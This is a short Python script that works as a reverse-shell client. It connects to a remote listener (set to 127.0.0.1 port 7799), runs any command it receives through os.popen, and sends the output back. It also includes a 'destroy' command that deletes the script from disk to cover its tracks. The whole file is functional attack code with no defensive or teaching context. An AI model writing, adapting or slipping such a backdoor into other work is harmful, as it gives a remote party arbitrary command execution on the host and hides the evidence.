import os
import socket
import subprocess
import sys

HOST = "127.0.0.1"
PORT = 7799


def destroy():
    subprocess.Popen(
        "python -c \"import os, time; time.sleep(1); os.remove('{}');\"".format(
            sys.argv[0]
        )
    )
    sys.exit(0)


def main():
    kill = False
    while not kill:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))
                print("Connected")

                while True:
                    data = s.recv(1024).decode()
                    if not data:
                        break
                    print(f"Received: {data}")
                    if data == "exit":
                        break
                    elif data == "kill":
                        kill = True
                        break
                    elif data == "destroy":
                        destroy()
                    toReturn = os.popen(data).read()
                    s.sendall(str.encode(toReturn))
        except Exception as e:
            print(f"Cannot connect: {e}")


if __name__ == "__main__":
    main()
